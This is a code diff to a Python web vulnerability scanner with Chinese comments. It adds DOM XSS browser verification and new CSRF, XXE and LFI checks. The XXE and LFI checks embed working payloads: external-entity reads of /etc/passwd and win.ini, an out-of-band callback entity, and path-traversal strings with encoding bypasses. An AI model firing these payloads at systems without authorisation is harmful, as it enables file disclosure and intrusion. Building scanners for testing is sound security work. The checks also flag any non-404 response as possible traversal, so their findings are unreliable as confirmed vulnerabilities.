@@ -14,6 +14,7 @@ from ..core.config import VulnForgeConfig
 from ..core.target import Target
 from ..utils.waf import WAFDetector
 from ..utils.oob import OOBDetector
+from ..utils.browser import BrowserAnalyzer
 
 
 class Finding:
@@ -58,11 +59,13 @@ class ScannerRunner:
         target: Target,
         client: Optional[httpx.AsyncClient] = None,
         oob: Optional[OOBDetector] = None,
+        enable_browser: bool = False,
     ):
         self.config = config
         self.target = target
         self.client = client
         self.oob = oob
+        self.enable_browser = enable_browser
         self.findings: list[Finding] = []
         self._seen: set[tuple[str, str, str, str]] = set()
         self.logger = logging.getLogger(__name__)
@@ -75,6 +78,16 @@ class ScannerRunner:
         )
         self.rate_limiter_uas = random_user_agent()
         self.rate_limiter_initialized = False
+
+        # 浏览器分析器（可选）
+        self.browser = None
+        if enable_browser and BrowserAnalyzer.HAS_PLAYWRIGHT:
+            try:
+                headless = config.get("browser.headless", True)
+                self.browser = BrowserAnalyzer(headless=headless)
+                self.logger.info("浏览器分析器已初始化")
+            except Exception as e:
+                self.logger.warning("浏览器分析器初始化失败: %s", e)
 
     def _add_finding(self, finding: Finding) -> None:
         """添加发现，去重检查"""
@@ -165,6 +178,13 @@ class ScannerRunner:
         if self.oob:
             tasks.append(self._scan_oob())
 
+        if self.config.get("scanner.enable_csrf", True):
+            tasks.append(self._scan_csrf())
+        if self.config.get("scanner.enable_xxe", True):
+            tasks.append(self._scan_xxe())
+        if self.config.get("scanner.enable_lfi", True):
+            tasks.append(self._scan_lfi())
+
         if tasks:
             await asyncio.gather(*tasks)
 
@@ -200,6 +220,13 @@ class ScannerRunner:
         if getattr(self, "_owns_client", False):
             await self.client.aclose()
             self.client = None
+
+        # 关闭浏览器
+        if self.browser:
+            try:
+                await self.browser.close()
+            except Exception:
+                pass
 
         return results
 
@@ -402,14 +429,29 @@ class ScannerRunner:
                     )
                     body = resp.text
                     if payload in body:
+                        severity = "medium"
+                        evidence = f"Payload未过滤反射: {payload[:50]}"
+                        description = f"反射型XSS ({label}) — 参数 {param_name} 未正确过滤"
+                        
+                        # DOM XSS 浏览器验证
+                        if self.browser:
+                            try:
+                                dom_result = await self.browser.check_dom_xss(test_url, payload)
+                                if dom_result.get("dom_xss"):
+                                    severity = "high"
+                                    evidence += f" | DOM XSS: {dom_result.get('evidence', '')}"
+                                    description += " [DOM XSS 确认 — 浏览器端可执行]"
+                            except Exception:
+                                pass
+                        
                         self._add_finding(Finding(
                             vuln_type="xss_reflected",
                             url=test_url,
                             param=param_name,
                             payload=payload,
-                            severity="medium",
-                            evidence=f"Payload未过滤反射: {payload[:50]}",
-                            description=f"反射型XSS ({label}) — 参数 {param_name} 未正确过滤",
+                            severity=severity,
+                            evidence=evidence,
+                            description=description,
                         ))
                 except Exception:
                     continue
@@ -441,14 +483,29 @@ class ScannerRunner:
                         )
                         body = resp.text
                         if payload in body:
+                            severity = "medium"
+                            evidence = f"POST Payload未过滤反射: {payload[:50]}"
+                            description = f"反射型XSS (POST/{label}) — 表单参数 {input_name} 未正确过滤"
+                            
+                            # DOM XSS 浏览器验证
+                            if self.browser:
+                                try:
+                                    dom_result = await self.browser.check_dom_xss(action_url, payload)
+                                    if dom_result.get("dom_xss"):
+                                        severity = "high"
+                                        evidence += f" | DOM XSS: {dom_result.get('evidence', '')}"
+                                        description += " [DOM XSS 确认 — 浏览器端可执行]"
+                                except Exception:
+                                    pass
+                            
                             self._add_finding(Finding(
                                 vuln_type="xss_reflected",
                                 url=action_url,
                                 param=input_name,
                                 payload=payload,
-                                severity="medium",
-                                evidence=f"POST Payload未过滤反射: {payload[:50]}",
-                                description=f"反射型XSS (POST/{label}) — 表单参数 {input_name} 未正确过滤",
+                                severity=severity,
+                                evidence=evidence,
+                                description=description,
                             ))
                     except Exception:
                         continue
@@ -690,6 +747,248 @@ class ScannerRunner:
                     ))
             except Exception:
                 continue
+
+    async def _scan_csrf(self) -> None:
+        """CSRF检测 — 检查POST表单是否缺少CSRF token"""
+        forms = self.recon_results.get("forms", [])
+        if not forms:
+            self.logger.debug("  [i] 无表单数据，跳过CSRF检测")
+            return
+
+        csrf_token_names = {
+            "csrf_token", "_token", "authenticity_token", "__csrf", "_csrf",
+            "csrfmiddlewaretoken", "token", "csrf", "xsrf", "nonce", "_xsrf",
+        }
+
+        for form in forms:
+            action_url = form.get("action", self.target.url)
+            method = form.get("method", "get").lower()
+            input_names = form.get("inputs", [])
+
+            if method != "post":
+                continue
+            if not input_names:
+                continue
+
+            # 检查表单是否有CSRF token input
+            has_csrf_field = any(
+                name.lower() in csrf_token_names
+                for name in input_names
+            )
+
+            if not has_csrf_field:
+                self._add_finding(Finding(
+                    vuln_type="csrf_missing",
+                    url=action_url,
+                    severity="medium",
+                    evidence=f"POST表单 {action_url} 缺少CSRF token字段",
+                    description=f"POST表单缺少CSRF防护令牌 — 输入字段: {input_names} 中未包含任何常见CSRF token名",
+                ))
+                self.logger.info(f"  [CSRF] 发现CSRF漏洞: {action_url}")
+
+            # 检查SameSite Cookie属性
+            try:
+                resp = await self._get(
+                    action_url,
+                    follow_redirects=False,
+                    timeout=10,
+                )
+                set_cookie = resp.headers.get("set-cookie", "")
+                if set_cookie:
+                    samesite_match = re.search(
+                        r"SameSite\s*=\s*(Strict|Lax|None)",
+                        set_cookie,
+                        re.IGNORECASE,
+                    )
+                    if not samesite_match:
+                        self._add_finding(Finding(
+                            vuln_type="csrf_missing",
+                            url=action_url,
+                            severity="medium",
+                            evidence=f"Cookie缺少SameSite属性: {set_cookie[:80]}",
+                            description=f"响应Cookie缺少SameSite属性，可能易受CSRF攻击",
+                        ))
+                        self.logger.info(f"  [CSRF] 发现Cookie缺少SameSite: {action_url}")
+                    elif samesite_match.group(1).lower() == "none":
+                        self._add_finding(Finding(
+                            vuln_type="csrf_missing",
+                            url=action_url,
+                            severity="low",
+                            evidence=f"SameSite=None: {set_cookie[:80]}",
+                            description=f"Cookie SameSite=None 不提供CSRF防护",
+                        ))
+            except Exception:
+                continue
+
+    async def _scan_xxe(self) -> None:
+        """XXE (XML外部实体注入) 检测"""
+        forms = self.recon_results.get("forms", [])
+        target_urls = set()
+
+        # 收集所有POST表单的action URL
+        for form in forms:
+            method = form.get("method", "get").lower()
+            if method == "post":
+                action_url = form.get("action", self.target.url)
+                target_urls.add(action_url)
+
+        # 如果没有表单，对目标URL本身做测试
+        if not target_urls:
+            target_urls.add(self.target.url)
+
+        oob_domain = ""
+        if self.oob:
+            oob_domain = self.oob.domain or "oob.vulnforge.local"
+
+        xxe_payloads = [
+            (
+                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
+                "Linux /etc/passwd",
+                ["root:x:0:0:", "root:x:0:0"],
+            ),
+            (
+                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>',
+                "Windows win.ini",
+                ["[fonts]", "[Fonts]", "[files]"],
+            ),
+        ]
+
+        # OOB payload — 只在有oob时添加
+        if oob_domain:
+            oob_payload = (
+                f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{oob_domain}/xxe">]><root>&xxe;</root>',
+                f"OOB ({oob_domain})",
+                [],
+            )
+            xxe_payloads.append(oob_payload)
+
+        for url in target_urls:
+            for payload, label, indicators in xxe_payloads:
+                try:
+                    # 先尝试纯XML content-type
+                    resp = await self.client.post(
+                        url,
+                        content=payload,
+                        headers={"Content-Type": "application/xml"},
+                        follow_redirects=False,
+                        timeout=10,
+                    )
+                    body = resp.text
+                    for indicator in indicators:
+                        if indicator in body:
+                            self._add_finding(Finding(
+                                vuln_type="xxe",
+                                url=url,
+                                payload=payload[:80],
+                                severity="critical",
+                                evidence=f"响应包含文件内容: {indicator}",
+                                description=f"XXE注入 ({label}) — {url} 存在XML外部实体注入漏洞",
+                            ))
+                            self.logger.info(f"  [XXE] 发现XXE漏洞 ({label}): {url}")
+                            break
+
+                    # 也检查OOB (即使没有文件内容回显)
+                    if label.startswith("OOB"):
+                        self._add_finding(Finding(
+                            vuln_type="xxe",
+                            url=url,
+                            payload=payload[:80],
+                            severity="critical",
+                            evidence=f"OOB XXE payload已发送至 {oob_domain}",
+                            description=f"XXE注入 ({label}) — {url}，等待OOB回调验证",
+                        ))
+                        self.logger.info(f"  [XXE] 发送OOB XXE payload: {url}")
+
+                    # 再次尝试带charset
+                    resp2 = await self.client.post(
+                        url,
+                        content=payload,
+                        headers={"Content-Type": "text/xml; charset=utf-8"},
+                        follow_redirects=False,
+                        timeout=10,
+                    )
+                    body2 = resp2.text
+                    for indicator in indicators:
+                        if indicator in body2 and indicator not in body:
+                            self._add_finding(Finding(
+                                vuln_type="xxe",
+                                url=url,
+                                payload=payload[:80],
+                                severity="critical",
+                                evidence=f"响应包含文件内容: {indicator}",
+                                description=f"XXE注入 ({label}) — {url} 存在XML外部实体注入漏洞（text/xml）",
+                            ))
+                            self.logger.info(f"  [XXE] 发现XXE漏洞 ({label}): {url}")
+                            break
+                except Exception:
+                    continue
+
+    async def _scan_lfi(self) -> None:
+        """LFI (本地文件包含 / 路径遍历) 检测"""
+        lfi_payloads = [
+            ("../../../etc/passwd", "标准Linux"),
+            ("..\\..\\..\\windows\\win.ini", "Windows路径"),
+            ("....//....//....//etc/passwd", "双点绕过"),
+            ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd", "URL编码绕过"),
+            ("..;/..;/..;/etc/passwd", "参数污染"),
+        ]
+
+        file_content_indicators = [
+            "root:x:",            # /etc/passwd 内容
+            "[fonts]",            # win.ini 内容
+            "[Fonts]",
+            "[files]",
+            "[Mail]",
+            "[Compatibility]",
+        ]
+
+        for param_name, param_value in self._get_test_params():
+            for payload, label in lfi_payloads:
+                try:
+                    test_url = self._inject_param(param_name, param_value, payload)
+                    resp = await self._get(
+                        test_url,
+                        follow_redirects=False,
+                        timeout=10,
+                    )
+                    body = resp.text
+                    status = resp.status_code
+
+                    # 检查是否有文件内容特征
+                    found_content = False
+                    for indicator in file_content_indicators:
+                        if indicator in body:
+                            self._add_finding(Finding(
+                                vuln_type="lfi",
+                                url=test_url,
+                                param=param_name,
+                                payload=payload,
+                                severity="high",
+                                evidence=f"响应包含文件内容: {indicator}",
+                                description=f"本地文件包含 ({label}) — 参数 {param_name} 存在LFI漏洞，可读取系统文件",
+                            ))
+                            self.logger.info(f"  [LFI] 发现LFI漏洞 ({label}): {test_url}")
+                            found_content = True
+                            break
+
+                    if found_content:
+                        continue
+
+                    # 非404响应说明路径存在（但不一定有文件内容）
+                    if status not in (404,):
+                        self._add_finding(Finding(
+                            vuln_type="lfi",
+                            url=test_url,
+                            param=param_name,
+                            payload=payload,
+                            severity="medium",
+                            evidence=f"HTTP {status} (非404，路径可能存在)",
+                            description=f"可能的路径遍历 ({label}) — 参数 {param_name} 返回 {status}，路径可能存在",
+                        ))
+                        self.logger.info(f"  [LFI] 发现可能的路径遍历 ({label}): {test_url} → {status}")
+
+                except Exception:
+                    continue
 
     async def _run_nuclei_scan(self) -> list[Finding]:
         """运行Nuclei深度扫描"""
